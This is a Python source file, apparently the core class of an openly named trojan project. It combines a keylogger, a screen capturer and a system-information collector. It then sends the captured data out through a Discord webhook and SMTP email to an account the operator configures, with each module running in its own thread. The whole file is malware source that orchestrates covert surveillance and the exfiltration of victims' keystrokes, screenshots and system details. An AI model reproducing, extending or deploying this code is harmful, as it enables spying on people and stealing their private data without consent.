#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = "EONRaider @ keybase.io/eonraider"

from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

from src.modules.exfiltration import Discord, Email
from src.modules.exploitation import KeyLogger, ScreenShot, SystemInformation


class Trojan:
    def __init__(self, *,
                 exfil_time: float,
                 screenshot: [str, Path],
                 delete_screenshot: bool,
                 webhook: str,
                 smtp_host: str,
                 smtp_port: int,
                 email: str,
                 password: str):
        """Set up a Trojan composed of exploitation and exfiltration
        modules.

        Args:
            exfil_time: Time in seconds to wait between periodic
                executions of the exfiltration of logged data. Set to
                None to perform a single operation.
            screenshot: A string or instance of pathlib.Path containing
                the absolute path to the location where the screenshot
                file will be written.
            delete_screenshot: Automatically delete the screenshot
                image after exfiltration is complete.
            webhook: URL to the Webhook set up on the Discord server's
                configuration.
            smtp_host: Address of the SMTP host to connect to.
            smtp_port: Port in which the SMTP host is listening for
                incoming messages.
            email: Address of the account to send emails to.
            password: Password for the account.
        """
        self.exfil_time = exfil_time
        self.screenshot = screenshot
        self.delete_screenshot = delete_screenshot
        self.webhook = webhook
        self.smtp_host = smtp_host
        self.smtp_port = smtp_port
        self.email = email
        self.password = password

    @property
    def modules(self):
        return {
            KeyLogger(exfil_time=self.exfil_time),
            ScreenShot(image_path=self.screenshot,
                       exfil_time=self.exfil_time,
                       auto_remove=self.delete_screenshot),
            SystemInformation()
        }

    def execute(self):
        with ThreadPoolExecutor() as executor:
            for module in self.modules:
                Discord(module=module,
                        webhook_url=self.webhook)
                Email(module=module,
                      smtp_host=self.smtp_host,
                      smtp_port=self.smtp_port,
                      email=self.email,
                      password=self.password)
                executor.submit(module.execute)
